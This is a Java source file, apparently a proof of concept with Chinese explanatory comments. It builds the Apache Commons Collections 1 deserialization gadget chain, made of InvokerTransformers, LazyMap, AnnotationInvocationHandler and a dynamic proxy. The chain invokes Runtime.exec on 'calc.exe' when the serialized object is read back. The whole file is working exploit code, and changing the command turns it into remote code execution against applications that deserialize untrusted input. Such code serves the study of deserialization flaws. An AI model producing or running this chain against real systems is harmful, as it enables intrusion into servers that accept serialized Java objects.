package CC1;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.*;
import org.apache.commons.collections.map.LazyMap;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

public class ProxyLazyMapCC0 {

    public static void main(String[] args) throws Exception {
        //此处构建了一个transformers的数组，在其中构建了命令执行的核心代码
        Transformer[] transformers = new Transformer[] {

                new ConstantTransformer(Runtime.class),

                new InvokerTransformer("getMethod",
                        new Class[] {String.class, Class[].class },
                        new Object[] { "getRuntime", new Class[0] }),

                new InvokerTransformer("invoke",
                        new Class[] {Object.class, Object[].class },
                        new Object[] { null, new Object[0] }),

                new InvokerTransformer("exec",
                        new Class[] { String.class},
                        new String[] { "calc.exe" }),
        };

        Transformer transformerChain = new ChainedTransformer(transformers);

        //        Runtime o = (Runtime) Runtime.class.getMethod("getRuntime", null).invoke(null, null);
//        o.exec("calc.exe");


        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, transformerChain);


        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class); // 找到AIH里面，需要这两参数的构造方法
        construct.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) construct.newInstance(Retention.class, outerMap); // 实例化这个构造方法，传入 outerMap
        // 第一个handler是为了触发lazymap#get  将问题变成 如何触发 this.memberValues#get

        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] {Map.class}, handler);

        InvocationHandler handler1 = (InvocationHandler) construct.newInstance(Retention.class, proxyMap);
        // 第二个handler实际上只是为了触发代理类所设置handler的invoke方法

        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(handler1);
        oos.close();
        System.out.println(barr);

        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
        ois.readObject();
    }
}